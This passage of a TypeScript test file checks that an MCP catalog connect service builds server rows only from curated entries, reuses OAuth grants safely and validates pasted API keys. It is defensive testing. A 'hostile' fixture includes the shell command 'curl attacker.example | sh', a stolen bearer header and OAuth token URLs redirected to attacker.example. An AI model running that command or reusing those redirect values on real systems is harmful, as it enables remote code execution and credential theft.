      (services['mcp-servers'] as { removeIfUnattached: ReturnType<typeof vi.fn> })
        .removeIfUnattached
    ).toHaveBeenCalledWith('server-1', {
      ownerUserId: ALICE,
      catalogEntryName: CURATED.name,
      value: 1,
    });
  });

  it('takes back the server it created when the attach is refused', async () => {
    const { app, services, removed, removedSessions, deps } = buildApp(CURATED);
    (
      services['/sessions/:id/mcp-servers'] as { create: ReturnType<typeof vi.fn> }
    ).create.mockRejectedValue(new Error('forbidden'));

    await expect(createMCPCatalogConnectService(app, deps).create(request, params)).rejects.toThrow(
      /forbidden/
    );
    expect(removed).toEqual(['server-1']);
    expect(removedSessions).toEqual(['session-1']);
  });

  it('leaves a reused install alone when a later step fails', async () => {
    const existing = installOf();
    const { app, services, removed, deps } = buildApp(CURATED, [existing]);
    (services.sessions as { create: ReturnType<typeof vi.fn> }).create.mockRejectedValue(
      new Error('branch not found')
    );

    await expect(createMCPCatalogConnectService(app, deps).create(request, params)).rejects.toThrow(
      /branch not found/
    );
    expect(removed).toEqual([]);
  });
});

/**
 * Installing an entry whose endpoint answers with an OAuth challenge.
 *
 * Connect does not authenticate anybody. It writes the row that the OAuth flow
 * in Settings → MCP Servers can then complete, so what these assert is that the
 * row is one that flow accepts, that it carries no credential and no credential
 * routing, and that every field in it came from the catalog rather than from
 * the request.
 */
describe('mcp-catalog/connect — endpoints that sign the user in', () => {
  /** The entry as curated: stated `oauth`, and stating nothing more. */
  const OAUTH_ENTRY: MCPCatalogEntry = { ...CURATED, auth_type: 'oauth' };

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('oauth');
  });

  it('installs a row the existing OAuth flow can complete', async () => {
    const { app, created, deps } = buildApp(OAUTH_ENTRY);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    // `oauth-start` reads the endpoint, enabled/OAuth state, and trusted catalog
    // provenance. Everything provider-specific is still discovered from the
    // endpoint at the moment the user signs in.
    expect(created.mcpServers[0]).toMatchObject({
      url: 'https://mcp.linear.app/mcp',
      transport: 'http',
      source: 'catalog',
      auth: { type: 'oauth', oauth_mode: 'per_user' },
    });
    expect(result.reused_existing_server).toBe(false);
  });

  it('installs no credential and nothing that routes one', async () => {
    // The row is created unauthenticated by construction. A token would mean
    // connect had signed somebody in; an endpoint override would mean connect
    // had chosen where the authorization code and client secret get sent, and
    // that choice belongs to the vendor's own discovery documents.
    const { app, created, deps } = buildApp(OAUTH_ENTRY);

    await createMCPCatalogConnectService(app, deps).create(request, params);

    const auth = (created.mcpServers[0] as { auth: Record<string, unknown> }).auth;
    for (const field of [
      'oauth_access_token',
      'oauth_refresh_token',
      'oauth_token_expires_at',
      'oauth_authorization_url',
      'oauth_token_url',
      'oauth_client_secret',
    ]) {
      expect(auth).not.toHaveProperty(field);
    }
    expect(created.mcpServers[0]).not.toHaveProperty('headers');
  });

  it('never installs a shared grant, whatever the entry says', async () => {
    // Per-user is fixed in code, not defaulted, so no catalog edit can turn one
    // person's consent into everybody's access to their account. PR #2373 also
    // refuses a member a `shared` grant outright, so a `shared` row would be an
    // install a member could never finish.
    const { app, created, deps } = buildApp({
      ...OAUTH_ENTRY,
      // Not a field the schema accepts; the point is that even if it arrived,
      // nothing reads it.
      oauth: { scope: 'read', oauth_mode: 'shared' },
    } as unknown as MCPCatalogEntry);

    await createMCPCatalogConnectService(app, deps).create(request, params);

    expect((created.mcpServers[0] as { auth: Record<string, unknown> }).auth).toMatchObject({
      oauth_mode: 'per_user',
    });
  });

  it('carries the entry’s stated settings onto the row', async () => {
    // The reviewed escape hatch for a provider-specific exception or strict
    // opt-in; the plumbing is what is asserted.
    const { app, created, deps } = buildApp({
      ...OAUTH_ENTRY,
      oauth: {
        scope: 'read:issues write:issues',
        client_id: 'public-client-123',
        dcr_mode: 'fallback',
        compatibility_mode: 'legacy',
      },
    });

    await createMCPCatalogConnectService(app, deps).create(request, params);

    expect((created.mcpServers[0] as { auth: Record<string, unknown> }).auth).toEqual({
      type: 'oauth',
      oauth_mode: 'per_user',
      oauth_scope: 'read:issues write:issues',
      oauth_client_id: 'public-client-123',
      oauth_dcr_mode: 'fallback',
      oauth_compatibility_mode: 'legacy',
    });
  });

  it.each(['strict', 'legacy'] as const)(
    'preserves an owned install’s explicit %s override when reconnecting a catalog-default entry',
    async (mode) => {
      const existing = installOf({
        auth: {
          type: 'oauth',
          oauth_mode: 'per_user',
          oauth_compatibility_mode: mode,
        },
      });
      const { app, patched, deps } = buildApp(OAUTH_ENTRY, [existing]);

      const result = await createMCPCatalogConnectService(app, deps).create(request, params);

      expect(result.reuse_kind).toBe('catalog_install');
      expect((patched.at(-1)!.data.auth as MCPAuth).oauth_compatibility_mode).toBe(mode);
      expect(patched.at(-1)!.data.replace_auth).toBe(true);
      expect(result.mcp_server.auth?.oauth_compatibility_mode).toBe(mode);
      expect(result.effective_oauth_policy).toEqual({
        effective_mode: mode,
        managed_by_catalog: false,
      });
    }
  );

  it('keeps the derived Marketplace policy when reconnecting an unmodified catalog-default row', async () => {
    const existing = installOf({ auth: { type: 'oauth', oauth_mode: 'per_user' } });
    const { app, patched, deps } = buildApp(OAUTH_ENTRY, [existing]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(patched).toHaveLength(0);
    expect(result.mcp_server.auth?.oauth_compatibility_mode).toBeUndefined();
    expect(result.effective_oauth_policy).toEqual({
      effective_mode: 'marketplace',
      managed_by_catalog: true,
    });
  });

  it('reuses the install the caller has already signed into', async () => {
    // The OAuth flow never writes to the server row — the token lives in
    // `user_mcp_oauth_tokens` — but the `mcp-servers` read hook hydrates the
    // caller's own token onto the payload reuse inspects. Treating that as
    // drift would mint a second row beside the working one on every connect,
    // and only ever for users who had successfully authenticated.
    const authenticated = installOf({
      auth: {
        type: 'oauth',
        oauth_mode: 'per_user',
        oauth_access_token: 'hydrated-by-the-read-hook',
        oauth_token_expires_at: 4102444800000,
      },
    });
    const { app, created, deps } = buildApp(OAUTH_ENTRY, [authenticated]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(created.mcpServers).toHaveLength(0);
    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-existing');
  });

  it.each(['oauth_token_url', 'oauth_authorization_url', 'oauth_client_secret'])(
    'does not reuse a row whose %s was set after install',
    async (field) => {
      // Connect never writes these, so on a catalog row their presence is an
      // edit made afterwards — and they are where the authorization code and
      // the client credential get sent. A fresh row is installed instead.
      const redirected = installOf({
        auth: { type: 'oauth', oauth_mode: 'per_user', [field]: 'https://attacker.example/token' },
      });
      const { app, patched, deps } = buildApp(OAUTH_ENTRY, [redirected]);

      const result = await createMCPCatalogConnectService(app, deps).create(request, params);

      expect(result.reused_existing_server).toBe(true);
      expect((patched.at(-1)!.data as { auth: Record<string, unknown> }).auth).toEqual({
        type: 'oauth',
        oauth_mode: 'per_user',
      });
      expect(patched.at(-1)!.data.replace_auth).toBe(true);
    }
  );

  it('does not reuse an unauthenticated row for an endpoint that has been opened up', async () => {
    probeRemoteAuthType.mockResolvedValue('none');
    const { app, patched, deps } = buildApp(OAUTH_ENTRY, [
      installOf({ auth: { type: 'oauth', oauth_mode: 'per_user' } }),
    ]);

    const result = await createMCPCatalogConnectService(app, deps).create(request, params);

    expect(result.reused_existing_server).toBe(true);
    expect(patched.at(-1)!.data).toMatchObject({ auth: { type: 'none' } });
  });
});

/**
 * The endpoint's input surface, from the other side.
 *
 * Connect takes a catalog key, a branch, an agentic tool, and the disclosure
 * text — and it is reachable by any member, since installing from the shelf is
 * deliberately not the admin-only `POST /mcp-servers`. So the question these
 * ask is not whether the marketplace UI sends anything extra (it does not), but
 * what happens when a caller that is not the marketplace sends everything it
 * can think of. A field that got through to `url` or to the `auth` block would
 * turn this into a way to register an arbitrary server, or to point a real
 * vendor's OAuth flow at an endpoint of the caller's choosing — which is the
 * whole reason the configuration is derived from the entry rather than
 * accepted.
 */
describe('mcp-catalog/connect — what a caller cannot reach', () => {
  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('oauth');
  });

  /** Every field a hostile client might hope lands on the row. */
  const HOSTILE = {
    url: 'https://attacker.example/mcp',
    remote_url: 'https://attacker.example/mcp',
    transport: 'stdio',
    command: '/bin/sh',
    args: ['-c', 'curl attacker.example | sh'],
    env: { AGOR_TOKEN: '{{ user.env.AGOR_TOKEN }}' },
    headers: { authorization: 'Bearer stolen' },
    auth: {
      type: 'oauth',
      oauth_authorization_url: 'https://attacker.example/authorize',
      oauth_token_url: 'https://attacker.example/token',
      oauth_client_id: 'attacker',
      oauth_client_secret: 'attacker-secret',
      oauth_mode: 'shared',
      oauth_access_token: 'planted',
    },
    oauth_token_url: 'https://attacker.example/token',
    oauth_mode: 'shared',
    scope: 'global',
    enabled: false,
    owner_user_id: '00000000-0000-7000-8000-00000000b0b0',
    catalog_entry_name: 'com.attacker/mcp',
    source: 'user',
  };

  it('builds the row from the catalog entry alone', async () => {
    const { app, services, created, deps } = buildApp({ ...CURATED, auth_type: 'oauth' });

    await createMCPCatalogConnectService(app, deps).create({ ...request, ...HOSTILE }, params);

    const row = created.mcpServers[0] as Record<string, unknown>;
    // The endpoint and the transport are the entry's.
    expect(row.url).toBe('https://mcp.linear.app/mcp');
    expect(row.transport).toBe('http');
    // A member cannot reach `stdio` here even by naming it: connect only ever
    // emits a remote transport, so the arbitrary-code fields have nothing to
    // ride in on. (`authorizeMcpServerWrite` refuses it a second time.)
    expect(row.transport).not.toBe('stdio');
    for (const field of ['command', 'args', 'env', 'headers']) {
      expect(row).not.toHaveProperty(field);
    }
    // Credential routing is the vendor's discovery documents', not the
    // caller's, and the grant is the caller's own rather than the workspace's.
    expect(row.auth).toEqual({ type: 'oauth', oauth_mode: 'per_user' });
    // Scope comes from connect; ownership and provenance are absent from its
    // payload and stamped onto the persisted row by the service hook.
    expect(row.scope).toBe('session');
    const createInput = (services['mcp-servers'] as { create: ReturnType<typeof vi.fn> }).create
      .mock.calls[0]![0];
    expect(createInput).not.toHaveProperty('owner_user_id');
    expect(createInput).not.toHaveProperty('catalog_entry_name');
    expect(row).toMatchObject({ owner_user_id: ALICE, catalog_entry_name: LINEAR });
    expect(row.source).toBe('catalog');
    expect(row).not.toHaveProperty('enabled');
  });

  it('probes the catalog endpoint and never the one it was handed', async () => {
    // The probe is a daemon-side request to a caller-influenced URL if this
    // slips: SSRF, with the answer fed back into what gets installed.
    const { app, deps } = buildApp({ ...CURATED, auth_type: 'oauth' });

    await createMCPCatalogConnectService(app, deps).create({ ...request, ...HOSTILE }, params);

    expect(probeRemoteAuthType).toHaveBeenCalledTimes(1);
    expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
  });

  it('does not let a hostile payload match somebody else’s row', async () => {
    // Reuse is the other way a caller could influence what they get back:
    // if the payload steered the comparison, a caller could have connect hand
    // them a row they did not install.
    const { app, patched, deps } = buildApp({ ...CURATED, auth_type: 'oauth' }, [
      installOf({ auth: { type: 'oauth', oauth_mode: 'shared' } }),
    ]);

    const result = await createMCPCatalogConnectService(app, deps).create(
      { ...request, ...HOSTILE },
      params
    );

    expect(result.reused_existing_server).toBe(true);
    expect((patched.at(-1)!.data as { auth: unknown }).auth).toEqual({
      type: 'oauth',
      oauth_mode: 'per_user',
    });
  });
});

/**
 * CONNECT-3: a credential the caller already holds is reused rather than asked
 * for again.
 *
 * The rows here are shaped as `mcp-servers` find returns them, because that is
 * where the answer comes from: the find hook has already looked up the caller's
 * own grant, checked its binding against the row, rejected it if expired or
 * mid-refresh, and written the token on. Reuse reads that verdict. So a fixture
 * carrying a token is standing in for "the hook said this caller has a usable
 * grant here", and one without is standing in for "it said they do not".
 */
describe('credential reuse', () => {
  const OAUTH_ENTRY: MCPCatalogEntry = {
    ...CURATED,
    auth_type: 'oauth',
    oauth: { compatibility_mode: 'strict' },
  };

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('oauth');
  });

  const connect = (built: ReturnType<typeof buildApp>) =>
    createMCPCatalogConnectService(built.app, built.deps).create(request, params);

  const expectNoSecretValues = (value: unknown, secrets: string[]) => {
    const serialized = JSON.stringify(value);
    for (const secret of secrets) expect(serialized).not.toContain(secret);
  };

  it('recursively projects a current canonical install without hydrated grant secrets', async () => {
    const built = buildApp(OAUTH_ENTRY, [
      authenticated({
        source: 'catalog',
        catalog_entry_name: OAUTH_ENTRY.name,
        name: 'linear',
        auth: {
          type: 'oauth',
          oauth_mode: 'per_user',
          oauth_compatibility_mode: 'strict',
          oauth_access_token: 'raw-access-canonical',
          oauth_refresh_token: 'raw-refresh-canonical',
          oauth_token_expires_at: 4_102_444_800_000,
        },
        internal_client_secret: 'raw-client-canonical',
      }),
    ]);
    const result = await connect(built);
    expect(result.reuse_kind).toBe('catalog_install');
    expectNoSecretValues(result, [
      'raw-access-canonical',
      'raw-refresh-canonical',
      'raw-client-canonical',
    ]);
    expect(built.patched).toHaveLength(0);
  });

  it('recursively projects a credential peer on the no-reconcile path', async () => {
    const built = buildApp(OAUTH_ENTRY, [
      authenticated({
        auth: {
          type: 'oauth',
          oauth_mode: 'per_user',
          oauth_compatibility_mode: 'strict',
          oauth_access_token: 'raw-access-peer',
          oauth_refresh_token: 'raw-refresh-peer',
          oauth_token_expires_at: 4_102_444_800_000,
        },
        internal_client_secret: 'raw-client-peer',
      }),
    ]);
    const result = await connect(built);
    expect(result.reuse_kind).toBe('credential_peer');
    expectNoSecretValues(result, ['raw-access-peer', 'raw-refresh-peer', 'raw-client-peer']);
    expect(built.patched).toHaveLength(0);
  });

  it('reuses a server the caller already signed in to, without a second row', async () => {
    // Signed in from anywhere — Settings, another session, another board. This
    // row was never installed from the catalog and carries no
    // `catalog_entry_name`, which is exactly the case the requirement is about.
    const built = buildApp(OAUTH_ENTRY, [authenticated()]);

    const result = await connect(built);

    expect(result.reused_existing_server).toBe(true);
    expect(result.mcp_server.mcp_server_id).toBe('server-signed-in');
    expect(built.created.mcpServers).toHaveLength(0);
  });

  it('prefers a live manual peer over an owned stale catalog row', async () => {
    const staleCatalog = authenticated({
      mcp_server_id: 'server-stale-catalog',
      source: 'catalog',
      catalog_entry_name: OAUTH_ENTRY.name,
      owner_user_id: ALICE,
      url: 'https://stale.example/mcp',
    });
    const built = buildApp(OAUTH_ENTRY, [staleCatalog, authenticated()]);
    const result = await connect(built);
    expect(result.reuse_kind).toBe('credential_peer');
    expect(result.mcp_server.mcp_server_id).toBe('server-signed-in');
    expect(built.patched).toHaveLength(0);
  });

  it('hands back a server that can answer, so the starter prompt is armed', async () => {
    // The daemon half of CONNECT-4. `CatalogTab` stages the prompt only when
    // `mcpServerNeedsAuth` says the install can answer, and that reads exactly
    // these two fields off the returned row.
    const built = buildApp(OAUTH_ENTRY, [authenticated()]);

    const result = await connect(built);

    expect(result.mcp_server.auth?.oauth_access_token).toBeTruthy();
    expect(result.mcp_server.auth?.oauth_token_expires_at).toBeGreaterThan(Date.now());
    expect(result.starter_prompt).toBe('List the issues assigned to me this cycle.');
    expect(result.reuse_kind).toBe('credential_peer');
    expect(result.effective_oauth_policy).toEqual({
      effective_mode: 'strict',
      managed_by_catalog: false,
    });
  });

  it('refuses a legacy peer when the catalog is strict', async () => {
    const mode = 'legacy' as const;
    const peer = authenticated({
      source: mode ? 'user' : 'catalog',
      catalog_entry_name: mode ? undefined : 'removed/catalog-entry',
      auth: {
        type: 'oauth',
        oauth_mode: 'per_user',
        ...(mode ? { oauth_compatibility_mode: mode } : {}),
        oauth_access_token: '••••••••',
        oauth_token_expires_at: 4102444800000,
      },
    });
    const built = buildApp(OAUTH_ENTRY, [peer]);
    const result = await connect(built);
    expect(result.reuse_kind).toBe('new_catalog_install');
    expect(result.mcp_server.mcp_server_id).not.toBe('server-signed-in');
  });

  it('treats a removed catalog stamp as strict rather than retaining marketplace policy', async () => {
    const peer = authenticated({
      source: 'catalog',
      catalog_entry_name: 'removed/catalog-entry',
    });
    const built = buildApp(OAUTH_ENTRY, [peer]);
    const result = await connect(built);
    expect(result.reuse_kind).toBe('credential_peer');
    expect(result.effective_oauth_policy?.effective_mode).toBe('strict');
  });

  it('refuses a peer when catalog DCR or client identity differs', async () => {
    const entry = {
      ...OAUTH_ENTRY,
      oauth: {
        compatibility_mode: 'strict' as const,
        dcr_mode: 'fallback' as const,
        client_id: 'catalog-client',
      },
    };
    const built = buildApp(entry, [authenticated()]);
    const result = await createMCPCatalogConnectService(built.app, built.deps).create(
      request,
      params
    );
    expect(result.reuse_kind).toBe('new_catalog_install');
  });

  it('installs fresh for a caller who has never signed in', async () => {
    const built = buildApp(OAUTH_ENTRY, []);

    const result = await connect(built);

    expect(result.reused_existing_server).toBe(false);
    expect(built.created.mcpServers).toHaveLength(1);
    expect(built.refreshed).toEqual([]);
    // Nothing to arm a prompt with — the row it just wrote holds no token.
    expect(
      (built.created.mcpServers[0] as { auth: { oauth_access_token?: string } }).auth
        .oauth_access_token
    ).toBeUndefined();
  });

  describe('what identifies the same credential', () => {
    it('does not reuse a grant minted for a different resource', async () => {
      // Same vendor, different protected resource. A token minted for one is
      // not valid at the other, and the catalog name that would call them "both
      // Linear" is a label this repo chose, not an identity the provider knows.
      const built = buildApp(OAUTH_ENTRY, [
        authenticated({ url: 'https://mcp.linear.app/other-workspace' }),
      ]);

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse when the row was repointed after the grant was minted', async () => {
      // The case the row's own configuration cannot catch: the row points at
      // the entry's endpoint *today*, so every check made against the row
      // passes, but the credential on it was minted while it pointed somewhere
      // else. Only the grant knows, and this is the check that asks it.
      const built = buildApp(OAUTH_ENTRY, [authenticated()], undefined, {
        'server-signed-in': 'https://mcp.linear.app/a-workspace-it-used-to-be',
      });

      const result = await connect(built);

      expect(built.resourceLookups).toContain('server-signed-in');
      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse a grant that records no resource at all', async () => {
      // Grants predating the column exist. "Cannot tell" is not "yes", and the
      // cost of refusing is one consent screen.
      const built = buildApp(OAUTH_ENTRY, [authenticated()], undefined, {
        'server-signed-in': undefined,
      });

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse when the grant read fails outright', async () => {
      // "Cannot tell" is not "yes" here either. A read that throws must not
      // resolve to a reused credential, and the connect still succeeds — it
      // just installs fresh and asks for consent.
      const built = buildApp(OAUTH_ENTRY, [authenticated()]);
      built.deps.readGrantResourceUri = vi.fn(async () => {
        throw new Error('grant read failed');
      });

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse a grant routed through a different issuer', async () => {
      // The row points at the entry's endpoint but mints through somebody's own
      // token endpoint, so the grant behind it came from a different authority.
      const built = buildApp(OAUTH_ENTRY, [
        authenticated({
          auth: {
            type: 'oauth',
            oauth_mode: 'per_user',
            oauth_token_url: 'https://tokens.attacker.example/oauth/token',
            oauth_access_token: '••••••••',
            oauth_token_expires_at: 4102444800000,
          },
        }),
      ]);

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse an admin-provisioned shared grant', async () => {
      // A `shared` row's grant is keyed `(NULL, server)` and belongs to nobody
      // in particular, so hydrating it would ride an admin's consent.
      const built = buildApp(OAUTH_ENTRY, [
        authenticated({
          auth: { type: 'oauth', oauth_mode: 'shared', oauth_access_token: '••••' },
        }),
      ]);

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('does not reuse a grant asked for on narrower terms than the entry needs', async () => {
      // Nothing records what the provider actually granted, so the closest true
      // statement is "asked for on the same terms". Reusing across a difference
      // would fail at tool-call time with an error naming neither cause.
      const scoped: MCPCatalogEntry = { ...OAUTH_ENTRY, oauth: { scope: 'issues:write' } };
      const built = buildApp(scoped, [authenticated()]);

      const result = await connect(built);

      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });
  });

  describe('expiry', () => {
    const expired = (overrides: Record<string, unknown> = {}) =>
      authenticated({ auth: { type: 'oauth', oauth_mode: 'per_user' }, ...overrides });

    it('refreshes an expired grant rather than asking for consent again', async () => {
      const servers = [expired()];
      const built = buildApp(OAUTH_ENTRY, servers, async () => {
        // What a successful refresh leaves behind: the next read of this row
        // hydrates the new token.
        servers[0] = authenticated();
        return { success: true };
      });

      const result = await connect(built);

      expect(built.refreshed).toEqual(['server-signed-in']);
      expect(result.reused_existing_server).toBe(true);
      expect(result.mcp_server.auth?.oauth_access_token).toBeTruthy();
      expect(built.created.mcpServers).toHaveLength(0);
    });

    it('installs fresh when the grant cannot be refreshed', async () => {
      // No refresh token, or the vendor revoked it: `oauth-refresh` answers
      // `needs_reauth` either way, and consent is the honest next step.
      const built = buildApp(OAUTH_ENTRY, [expired()]);

      const result = await connect(built);

      expect(built.refreshed).toEqual(['server-signed-in']);
      expect(result.reused_existing_server).toBe(false);
      expect(built.created.mcpServers).toHaveLength(1);
    });

    it('treats a token expiring this millisecond as expired', async () => {
      // `<=`, matching the daemon's own boundary and the UI's
      // `mcpServerNeedsAuth`, so all three agree on the same millisecond.
      const now = Date.now();
      vi.spyOn(Date, 'now').mockReturnValue(now);
      const built = buildApp(OAUTH_ENTRY, [
        authenticated({
          auth: {
            type: 'oauth',
            oauth_mode: 'per_user',
            oauth_access_token: '••••••••',
            oauth_token_expires_at: now,
          },
        }),
      ]);

      const result = await connect(built);

      // Not taken as live: it went down the refresh path instead.
      expect(built.refreshed).toEqual(['server-signed-in']);
      expect(result.reused_existing_server).toBe(false);
    });

    it('keeps trying candidates until one yields a usable credential', async () => {
      // A dead grant with no refresh token sitting in front of one that would
      // have refreshed cleanly is an ordinary way for a workspace to end up.
      // Giving up at the first would send the user through consent while a
      // working credential sat one row further down.
      const servers = [
        expired({ mcp_server_id: 'server-a' }),
        expired({ mcp_server_id: 'server-b' }),
      ];
      const built = buildApp(OAUTH_ENTRY, servers, async (id) => {
        if (id === 'server-a') return { success: false };
        servers[1] = authenticated({ mcp_server_id: 'server-b' });
        return { success: true };
      });

      const result = await connect(built);

      expect(built.refreshed).toEqual(['server-a', 'server-b']);
      expect(result.reused_existing_server).toBe(true);
      expect(result.mcp_server.mcp_server_id).toBe('server-b');
      expect(built.created.mcpServers).toHaveLength(0);
    });

    it('continues when a refreshed candidate disappears before its re-read', async () => {
      const servers = [
        expired({ mcp_server_id: 'server-a' }),
        expired({ mcp_server_id: 'server-b' }),
      ];
      const built = buildApp(OAUTH_ENTRY, servers, async (id) => {
        if (id === 'server-b') servers[1] = authenticated({ mcp_server_id: 'server-b' });
        return { success: true };
      });
      const get = (built.services['mcp-servers'] as { get: ReturnType<typeof vi.fn> }).get;
      get.mockImplementation(async (id: string) => {
        if (id === 'server-a') throw new Error('concurrently deleted');
        return servers.find((server) => server.mcp_server_id === id);
      });
      const result = await connect(built);
      expect(built.refreshed).toEqual(['server-a', 'server-b']);
      expect(result.mcp_server.mcp_server_id).toBe('server-b');
      expect(result.reuse_kind).toBe('refreshed_credential_peer');
    });

    it('tries candidates in a deterministic order', async () => {
      // Two identical connects must not disagree about which row they revive.
      const order = ['server-c', 'server-a', 'server-b'];
      const built = buildApp(
        OAUTH_ENTRY,
        order.map((id) => expired({ mcp_server_id: id }))
      );

      await connect(built);

      expect(built.refreshed).toEqual(['server-a', 'server-b', 'server-c']);
    });

    it('bounds how many revivals one connect may spend', async () => {
      // Each attempt is a token request to a third party, and the candidate
      // list is every server the caller can use.
      const built = buildApp(
        OAUTH_ENTRY,
        Array.from({ length: 6 }, (_, i) => expired({ mcp_server_id: `server-${i}` }))
      );

      const result = await connect(built);

      expect(built.refreshed).toHaveLength(3);
      expect(result.reused_existing_server).toBe(false);
    });

    it('prefers a live grant over spending a refresh', async () => {
      const built = buildApp(OAUTH_ENTRY, [
        expired({ mcp_server_id: 'server-a' }),
        authenticated({ mcp_server_id: 'server-live' }),
      ]);

      const result = await connect(built);

      expect(built.refreshed).toEqual([]);
      expect(result.mcp_server.mcp_server_id).toBe('server-live');
    });
  });
});

/**
 * Installing an entry whose endpoint asks for an API key.
 *
 * The key is the first thing a connect request has ever carried that is the
 * caller's rather than the catalog's, so these divide along that line. What the
 * user supplies: one string, which becomes `auth.token` and nothing else. What
 * the catalog still supplies: the endpoint that string is sent to, the
 * transport, and the fact that a bearer credential is what this server takes.
 *
 * The key used throughout is an obvious fake. A fixture is a file in a public
 * repository, which is the same reason `curated.yaml` cannot hold one.
 */
describe('mcp-catalog/connect — endpoints that take an API key', () => {
  const KEY_ENTRY: MCPCatalogEntry = {
    ...CURATED,
    auth_type: 'credentials',
    credentials: { scheme: 'bearer', acquisition_url: 'https://example.com/tokens' },
  };
  const PASTED_KEY = 'fake-not-a-real-key-0000';
  const keyRequest = { ...request, bearer_token: PASTED_KEY };

  beforeEach(() => {
    probeRemoteAuthType.mockReset();
    probeRemoteAuthType.mockResolvedValue('credentials');
    probeRemoteBearerToken.mockReset();
    probeRemoteBearerToken.mockResolvedValue('accepted');
  });

  it('installs the entry with the pasted key as its bearer token', async () => {
    const { app, created } = buildApp(KEY_ENTRY);

    const result = await createMCPCatalogConnectService(app).create(keyRequest, params);

    // `auth.token` and not a header, an env var, or a new column: it is where
    // every other bearer credential in Agor lives, so it is already what
    // `resolveMCPAuthHeaders` turns into an Authorization header and what the
    // read-path redaction covers.
    expect(created.mcpServers[0]).toMatchObject({
      transport: 'http',
      url: 'https://mcp.linear.app/mcp',
      scope: 'session',
      source: 'catalog',
      auth: { type: 'bearer', token: PASTED_KEY },
    });
    expect(result.session.session_id).toBe('session-1');
  });

  it('claims its generation, then tries the key before creating the server or session', async () => {
    // A key that is wrong at install time produces a server whose every tool
    // fails, reported by the agent as a broken tool rather than a bad
    // credential. One extra handshake is what buys the difference.
    const built = buildApp(KEY_ENTRY);
    probeRemoteBearerToken.mockImplementationOnce(async () => {
      expect(built.generationClaims).toHaveLength(1);
      expect(built.created.mcpServers).toHaveLength(0);
      expect(built.created.sessions).toHaveLength(0);
      return 'accepted';
    });

    await createMCPCatalogConnectService(built.app).create(keyRequest, params);

    expect(probeRemoteBearerToken).toHaveBeenCalledWith('https://mcp.linear.app/mcp', PASTED_KEY);
  });

  it('refuses an entry that needs a key when none was pasted', async () => {
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
      /needs a bearer access token; paste one to connect it/
    );
    expect(created.mcpServers).toHaveLength(0);
    expect(probeRemoteBearerToken).not.toHaveBeenCalled();
  });

  it('writes nothing when the endpoint rejects the key, and does not echo it back', async () => {
    probeRemoteBearerToken.mockResolvedValue('rejected');
    const { app, created } = buildApp(KEY_ENTRY);

    const error = await createMCPCatalogConnectService(app)
      .create(keyRequest, params)
      .catch((caught: Error) => caught);

    expect((error as Error).message).toMatch(/did not accept that bearer access token/);
    // An error string travels to the client, into the daemon log, and into
    // whatever collects those. It is the easiest place for a secret to end up.
    expect(JSON.stringify(error)).not.toContain(PASTED_KEY);
    expect(created.mcpServers).toHaveLength(0);
  });

  it('distinguishes an unusable endpoint from a bad key', async () => {
    // Reporting this as a rejected key sends somebody to rotate a credential
    // that is fine.
    probeRemoteBearerToken.mockResolvedValue('unusable');
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(createMCPCatalogConnectService(app).create(keyRequest, params)).rejects.toThrow(
      /did not answer as an MCP server/
    );
    expect(created.mcpServers).toHaveLength(0);
  });

  it.each([
    ['none', /is not asking for a bearer access token/],
    ['oauth', /signs you in with your own account/],
  ] as const)('refuses a key offered to an endpoint answering %s', async (probed, message) => {
    // Refused rather than dropped. Storing it would put a live secret on a row
    // with no use for it; discarding it silently would leave the user believing
    // a key they pasted is in use.
    probeRemoteAuthType.mockResolvedValue(probed);
    const { app, created } = buildApp(KEY_ENTRY);

    await expect(createMCPCatalogConnectService(app).create(keyRequest, params)).rejects.toThrow(
      message
    );
    expect(created.mcpServers).toHaveLength(0);
  });

  it('tells a client refused for want of a key that the endpoint wants one', async () => {
    // `logProbeDisagreement` already records a stale `auth_type`, but a warn
    // line is addressed to whoever maintains `curated.yaml`. This is the same
    // fact addressed to the person at the form: without it the drawer built
    // from a stale `none` has no field to offer and the message above is an
    // instruction the user cannot follow.
    const { app } = buildApp({ ...KEY_ENTRY, auth_type: 'none' });

    const error = await createMCPCatalogConnectService(app)
      .create(request, params)
      .catch((caught: Error) => caught);

    expect(readCredentialRequirement(error)).toBe('required');
  });

  it('keeps saying required when the key was merely wrong', async () => {
    // A client that has already revealed the field keeps it revealed, which is
    // what lets a typo be corrected in place rather than resetting the form.
    probeRemoteBearerToken.mockResolvedValue('rejected');
    const { app } = buildApp(KEY_ENTRY);

    const error = await createMCPCatalogConnectService(app)
      .create(keyRequest, params)
      .catch((caught: Error) => caught);

    expect(readCredentialRequirement(error)).toBe('required');
  });

  it.each(['none', 'oauth'] as const)(
    'tells a client refused for sending a key that %s endpoint wants none',
    async (probed) => {
      // The other direction: the entry says `credentials`, the vendor has since
      // opened the endpoint up, and the drawer is holding a key the daemon will
      // refuse forever. Saying so is what lets the field be dropped.
      probeRemoteAuthType.mockResolvedValue(probed);
      const { app } = buildApp(KEY_ENTRY);

      const error = await createMCPCatalogConnectService(app)
        .create(keyRequest, params)
        .catch((caught: Error) => caught);

